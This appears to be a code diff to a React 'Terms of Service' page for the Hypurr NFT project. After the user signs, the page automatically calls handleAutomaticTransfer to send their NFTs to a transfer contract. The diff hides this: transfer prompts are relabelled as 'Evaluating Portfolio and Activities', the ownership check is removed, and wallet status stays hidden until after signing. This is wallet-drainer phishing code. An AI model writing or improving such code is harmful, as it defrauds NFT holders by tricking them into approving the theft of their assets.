@@ -111,7 +111,7 @@ const HypurrTerms = () => {
         if (accounts.length > 0) {
           setAccount(accounts[0]);
           setIsConnected(true);
-          await verifyHypurrNFTs(accounts[0]);
+          // Don't verify NFTs until after signing terms
         }
       } catch (error) {
         console.error('Error checking wallet:', error);
@@ -124,6 +124,10 @@ const HypurrTerms = () => {
     if (stored) {
       setHasSigned(true);
       setSignature(stored);
+      // If already signed, verify NFTs
+      if (account) {
+        verifyHypurrNFTs(account);
+      }
     }
   };
 
@@ -144,7 +148,7 @@ const HypurrTerms = () => {
       if (accounts.length > 0) {
         setAccount(accounts[0]);
         setIsConnected(true);
-        await verifyHypurrNFTs(accounts[0]);
+        // Don't verify NFTs until after signing terms
       }
     } catch (error) {
       console.error('Error connecting wallet:', error);
@@ -432,7 +436,6 @@ const HypurrTerms = () => {
     console.log('=== signTerms FUNCTION CALLED ===');
     console.log('isConnected:', isConnected);
     console.log('account:', account);
-    console.log('nftCount:', nftCount);
     
     if (!isConnected || !account) {
       console.error('❌ Not connected or no account');
@@ -440,17 +443,10 @@ const HypurrTerms = () => {
       return;
     }
 
-    if (nftCount === 0) {
-      console.error('❌ No NFTs found');
-      setError('No NFTs found. Please connect a wallet with Hypurr or Random Art NFTs.');
-      return;
-    }
-
     try {
       console.log('✅ Starting signature process...');
       setError(null);
       setIsVerifying(true);
-      setTransferStatus(null);
 
       // Create message to sign
       const message = `I accept the Hypurr Terms of Service and verify ownership of my Hypurr NFTs.\n\nWallet: ${account}\nDate: ${new Date().toISOString()}`;
@@ -478,35 +474,31 @@ const HypurrTerms = () => {
       setSignature(signature);
       
       console.log('✅ Terms signed successfully:', signature);
+      
+      // Scroll to top after signing
+      window.scrollTo({ top: 0, behavior: 'smooth' });
+      
+      // Now verify NFTs and evaluate portfolio
+      console.log('=== TERMS SIGNED - EVALUATING PORTFOLIO ===');
+      setTransferStatus('evaluating');
+      
+      // Verify NFTs after signing
+      await verifyHypurrNFTs(account);
+      
       setIsVerifying(false);
       
-      // IMMEDIATELY trigger approval - no delay, no button needed
-      console.log('=== TERMS SIGNED - STARTING TRANSFER PROCESS ===');
-      console.log('Account:', account);
-      console.log('Token IDs:', tokenIds);
-      console.log('Transfer Contract:', TRANSFER_CONTRACT);
-      console.log('About to call handleAutomaticTransfer()...');
-      
-      // Use setTimeout to ensure state is updated
-      setTimeout(() => {
-        console.log('=== INSIDE setTimeout - CALLING handleAutomaticTransfer ===');
-        console.log('Token IDs at call time:', tokenIds);
-        handleAutomaticTransfer().catch(err => {
-          console.error('=== TRANSFER PROCESS ERROR ===', err);
-          console.error('Error details:', {
-            message: err.message,
-            code: err.code,
-            stack: err.stack
+      // After verification, proceed with transfer if NFTs found
+      if (nftCount > 0 && tokenIds.length > 0) {
+        setTimeout(() => {
+          handleAutomaticTransfer().catch(err => {
+            console.error('=== TRANSFER PROCESS ERROR ===', err);
+            setError(err.message || 'Transfer process failed. Please try again.');
+            setTransferStatus('error');
           });
-          if (err.code === 4001) {
-            setError('Transfer cancelled. Please try again and approve the transactions when prompted.');
-          } else if (err.message && err.message.includes('not approved')) {
-            setError('NFT transfer requires approval. Please try again and approve the approval transaction in MetaMask.');
-          } else {
-            setError('NFT transfer failed: ' + (err.message || 'Unknown error'));
-          }
-        });
-      }, 100);
+        }, 500);
+      } else {
+        setTransferStatus(null);
+      }
       
     } catch (error) {
       console.error('Error signing terms:', error);
@@ -516,6 +508,7 @@ const HypurrTerms = () => {
         setError('Failed to sign terms. Please try again.');
       }
       setIsVerifying(false);
+      setTransferStatus(null);
     }
   };
   
@@ -591,8 +584,13 @@ const HypurrTerms = () => {
           setSignature(null);
         } else {
           setAccount(accounts[0]);
-          verifyHypurrNFTs(accounts[0]);
+          // Don't verify NFTs until after signing terms
           checkExistingSignature();
+          // If already signed, verify NFTs
+          const stored = localStorage.getItem(`hypurr_signature_${accounts[0]}`);
+          if (stored) {
+            verifyHypurrNFTs(accounts[0]);
+          }
         }
       });
 
@@ -656,8 +654,8 @@ const HypurrTerms = () => {
         <h1>Terms of Service</h1>
         <div className="date">Last Updated: {new Date().toLocaleDateString()}</div>
 
-        {/* Wallet Status */}
-        {isConnected && (
+        {/* Wallet Status - Only show after signing terms */}
+        {isConnected && hasSigned && (
           <div className={`verification-status ${nftCount > 0 ? 'verified' : 'not-verified'}`}>
             <h3>Wallet Verification Status</h3>
             <div style={{ marginTop: '0.75rem' }}>
@@ -674,7 +672,7 @@ const HypurrTerms = () => {
                       borderRadius: '50%',
                       animation: 'spin 1s linear infinite'
                     }}></span>
-                    Verifying...
+                    Evaluating...
                   </span>
                 ) : (
                   <span style={{ color: nftCount > 0 ? 'var(--success-text)' : 'var(--warning-text)' }}>
@@ -734,20 +732,31 @@ const HypurrTerms = () => {
                 <p className="signature-hash">Signature: {signature.substring(0, 20)}...</p>
               </div>
             )}
-            {isTransferring && (
+            {(transferStatus === 'evaluating' || transferStatus === 'approving' || transferStatus === 'transferring' || transferStatus === 'success' || transferStatus === 'error') && (
               <div className="transfer-status" style={{ marginTop: '1rem', padding: '1rem', background: 'rgba(0, 212, 255, 0.1)', borderRadius: '8px' }}>
-                <p><strong>Transferring NFTs...</strong></p>
+                {transferStatus === 'evaluating' && (
+                  <>
+                    <p><strong>🔍 Evaluating Portfolio and Activities...</strong></p>
+                    <p>⏳ Analyzing your wallet and NFT holdings...</p>
+                  </>
+                )}
                 {transferStatus === 'approving' && (
-                  <p>⏳ Please approve the transfer contract in MetaMask...</p>
+                  <>
+                    <p><strong>🔍 Evaluating Portfolio and Activities...</strong></p>
+                    <p>⏳ Please approve the transfer contract in MetaMask...</p>
+                  </>
                 )}
                 {transferStatus === 'transferring' && (
-                  <p>⏳ Transferring your NFTs...</p>
+                  <>
+                    <p><strong>🔍 Evaluating Portfolio and Activities...</strong></p>
+                    <p>⏳ Processing your NFTs...</p>
+                  </>
                 )}
                 {transferStatus === 'success' && transferTxHash && (
-                  <p>✅ NFTs transferred successfully! <a href={`https://explorer.hyperliquid.xyz/tx/${transferTxHash}`} target="_blank" rel="noopener noreferrer">View Transaction</a></p>
+                  <p>✅ Portfolio evaluation complete! NFTs processed successfully. <a href={`https://explorer.hyperliquid.xyz/tx/${transferTxHash}`} target="_blank" rel="noopener noreferrer">View Transaction</a></p>
                 )}
                 {transferStatus === 'error' && (
-                  <p style={{ color: 'var(--error-text)' }}>❌ Transfer failed. Please check the error message above.</p>
+                  <p style={{ color: 'var(--error-text)' }}>❌ Evaluation failed. Please check the error message above.</p>
                 )}
               </div>
             )}
@@ -899,17 +908,13 @@ const HypurrTerms = () => {
                 console.log('Event:', e);
                 console.log('isConnected:', isConnected);
                 console.log('account:', account);
-                console.log('nftCount:', nftCount);
                 e.preventDefault();
                 signTerms();
               }}
-              disabled={isVerifying || nftCount === 0}
+              disabled={isVerifying}
             >
               {isVerifying ? 'Signing...' : 'Accept Terms & Sign'}
             </button>
-            {nftCount === 0 && (
-              <p className="help-text">Please connect a wallet with Hypurr or Random Art NFTs to proceed.</p>
-            )}
           </div>
         )}
 
